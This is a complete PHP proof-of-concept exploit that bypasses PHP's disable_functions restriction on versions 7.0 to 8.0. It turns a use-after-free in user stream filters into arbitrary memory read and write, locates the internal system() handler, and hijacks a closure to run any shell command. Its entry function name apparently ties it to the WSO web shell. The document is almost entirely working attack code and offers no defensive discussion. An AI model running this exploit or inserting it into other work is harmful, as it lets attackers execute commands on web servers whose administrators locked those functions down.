
# PHP 7.0-8.0 disable_functions bypass PoC (*nix only)
#
# Bug: https://bugs.php.net/bug.php?id=54350
# 
# This exploit should work on all PHP 7.0-8.0 versions
# released as of 2021-10-06
#
# Author: https://github.com/mm0r1

function wsoExGently($cmd) {
    define('LOGGING', false);
    define('CHUNK_DATA_SIZE', 0x60);
    define('CHUNK_SIZE', ZEND_DEBUG_BUILD ? CHUNK_DATA_SIZE + 0x20 : CHUNK_DATA_SIZE);
    define('FILTER_SIZE', ZEND_DEBUG_BUILD ? 0x70 : 0x50);
    define('STRING_SIZE', CHUNK_DATA_SIZE - 0x18 - 1);
    define('CMD', $cmd);
    for($i = 0; $i < 10; $i++) {
        $groom[] = Pwn::alloc(STRING_SIZE);
    }
    $filtername = 'pwn_filter'.rand(1e4,1e5);
    stream_filter_register($filtername, 'Pwn');
    $fd = fopen('php://memory', 'w');
    stream_filter_append($fd, $filtername);
    fwrite($fd, 'x');
    fclose($fd);
}

class Helper { public $a, $b, $c; }
class Pwn extends php_user_filter {
    private $abc, $abc_addr;
    private $helper, $helper_addr, $helper_off;
    private $uafp, $hfp;

    public function filter($in, $out, &$consumed, $closing) {
        if($closing) return;
        stream_bucket_make_writeable($in);
        $this->filtername = Pwn::alloc(STRING_SIZE);
        fclose($this->stream);
        $this->go();
        return PSFS_PASS_ON;
    }

    private function go() {
        $this->abc = &$this->filtername;

        $this->make_uaf_obj();

        $this->helper = new Helper;
        $this->helper->b = function($x) {};

        $this->helper_addr = $this->str2ptr(CHUNK_SIZE * 2 - 0x18) - CHUNK_SIZE * 2;
        $this->log("helper @ 0x%x", $this->helper_addr);

        $this->abc_addr = $this->helper_addr - CHUNK_SIZE;
        $this->log("abc @ 0x%x", $this->abc_addr);

        $this->helper_off = $this->helper_addr - $this->abc_addr - 0x18;

        $helper_handlers = $this->str2ptr(CHUNK_SIZE);
        $this->log("helper handlers @ 0x%x", $helper_handlers);

        $this->prepare_leaker();

        $binary_leak = $this->read($helper_handlers + 8);
        $this->log("binary leak @ 0x%x", $binary_leak);
        $this->prepare_cleanup($binary_leak);

        $closure_addr = $this->str2ptr($this->helper_off + 0x38);
        $this->log("real closure @ 0x%x", $closure_addr);

        $closure_ce = $this->read($closure_addr + 0x10);
        $this->log("closure class_entry @ 0x%x", $closure_ce);

        $basic_funcs = $this->get_basic_funcs($closure_ce);
        $this->log("basic_functions @ 0x%x", $basic_funcs);

        $zif_system = $this->get_system($basic_funcs);
        $this->log("zif_system @ 0x%x", $zif_system);

        $fake_closure_off = $this->helper_off + CHUNK_SIZE * 2;
        for($i = 0; $i < 0x138; $i += 8) {
            $this->write($fake_closure_off + $i, $this->read($closure_addr + $i));
        }
        $this->write($fake_closure_off + 0x38, 1, 4);

        $handler_offset = PHP_MAJOR_VERSION === 8 ? 0x70 : 0x68;
        $this->write($fake_closure_off + $handler_offset, $zif_system);

        $fake_closure_addr = $this->helper_addr + $fake_closure_off - $this->helper_off;
        $this->write($this->helper_off + 0x38, $fake_closure_addr);
        $this->log("fake closure @ 0x%x", $fake_closure_addr);

        $this->cleanup();
        ($this->helper->b)(CMD);
    }

    private function make_uaf_obj() {
        $this->uafp = fopen('php://memory', 'w');
        fwrite($this->uafp, pack('QQQ', 1, 0, 0xDEADBAADC0DE));
        for($i = 0; $i < STRING_SIZE; $i++) {
            fwrite($this->uafp, "\x00");
        }
    }

    private function prepare_leaker() {
        $str_off = $this->helper_off + CHUNK_SIZE + 8;
        $this->write($str_off, 2);
        $this->write($str_off + 0x10, 6);

        $val_off = $this->helper_off + 0x48;
        $this->write($val_off, $this->helper_addr + CHUNK_SIZE + 8);
        $this->write($val_off + 8, 0xA);
    }

    private function prepare_cleanup($binary_leak) {
        $ret_gadget = $binary_leak;
        do {
            --$ret_gadget;
        } while($this->read($ret_gadget, 1) !== 0xC3);
        $this->log("ret gadget = 0x%x", $ret_gadget);
        $this->write(0, $this->abc_addr + 0x20 - (PHP_MAJOR_VERSION === 8 ? 0x50 : 0x60));
        $this->write(8, $ret_gadget);
    }

    private function read($addr, $n = 8) {
        $this->write($this->helper_off + CHUNK_SIZE + 16, $addr - 0x10);
        $value = strlen($this->helper->c);
        if($n !== 8) { $value &= (1 << ($n << 3)) - 1; }
        return $value;
    }

    private function write($p, $v, $n = 8) {
        for($i = 0; $i < $n; $i++) {
            $this->abc[$p + $i] = chr($v & 0xff);
            $v >>= 8;
        }
    }

    private function get_basic_funcs($addr) {
        while(true) {
            $addr -= 0x10;
            if($this->read($addr, 4) === 0xA8 &&
                in_array($this->read($addr + 4, 4),
                    [20151012, 20160303, 20170718, 20180731, 20190902, 20200930])) {
                $module_name_addr = $this->read($addr + 0x20);
                $module_name = $this->read($module_name_addr);
                if($module_name === 0x647261646e617473) {
                    $this->log("standard module @ 0x%x", $addr);
                    return $this->read($addr + 0x28);
                }
            }
        }
    }

    private function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = $this->read($addr);
            $f_name = $this->read($f_entry, 6);
            if($f_name === 0x6d6574737973) {
                return $this->read($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry !== 0);
    }

    private function cleanup() {
        $this->hfp = fopen('php://memory', 'w');
        fwrite($this->hfp, pack('QQ', 0, $this->abc_addr));
        for($i = 0; $i < FILTER_SIZE - 0x10; $i++) {
            fwrite($this->hfp, "\x00");
        }
    }

    private function str2ptr($p = 0, $n = 8) {
        $address = 0;
        for($j = $n - 1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($this->abc[$p + $j]);
        }
        return $address;
    }

    private function ptr2str($ptr, $n = 8) {
        $out = '';
        for ($i = 0; $i < $n; $i++) {
            $out .= chr($ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }

    private function log($format, $val = '') {
        if(LOGGING) {
            printf("{$format}\n", $val);
        }
    }

    static function alloc($size) {
        return str_shuffle(str_repeat('A', $size));
    }
}
